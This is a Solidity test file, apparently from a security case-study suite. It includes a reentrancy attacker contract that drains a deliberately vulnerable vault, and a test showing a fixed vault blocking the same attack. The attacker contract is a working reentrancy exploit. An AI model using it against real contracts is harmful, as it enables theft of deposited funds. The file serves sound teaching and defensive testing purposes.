// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {
    ReentrancyVulnerableVault
} from "../../src/security-case-studies/ReentrancyVulnerableVault.sol";
import {ReentrancyFixedVault} from "../../src/security-case-studies/ReentrancyFixedVault.sol";

interface IReentrancyVault {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    IReentrancyVault public target;

    constructor(address target_) {
        target = IReentrancyVault(target_);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }
}

contract ReentrancyCaseStudyTest is Test {
    ReentrancyVulnerableVault public vulnerableVault;
    ReentrancyFixedVault public fixedVault;

    address public victim = address(1);
    address public attacker = address(2);

    function setUp() public {
        vulnerableVault = new ReentrancyVulnerableVault();
        fixedVault = new ReentrancyFixedVault();

        vm.deal(victim, 10 ether);
        vm.deal(attacker, 10 ether);
    }

    function testVulnerableVaultCanBeDrainedByReentrancy() public {
        vm.prank(victim);
        vulnerableVault.deposit{value: 5 ether}();

        assertEq(address(vulnerableVault).balance, 5 ether);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(address(vulnerableVault));

        vm.prank(attacker);
        attackerContract.attack{value: 1 ether}();

        assertEq(address(vulnerableVault).balance, 0);
        assertEq(address(attackerContract).balance, 6 ether);
    }

    function testFixedVaultBlocksReentrancyAttack() public {
        vm.prank(victim);
        fixedVault.deposit{value: 5 ether}();

        assertEq(address(fixedVault).balance, 5 ether);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(address(fixedVault));

        vm.prank(attacker);
        vm.expectRevert();
        attackerContract.attack{value: 1 ether}();

        assertEq(address(fixedVault).balance, 5 ether);
        assertEq(address(attackerContract).balance, 0);
    }
}
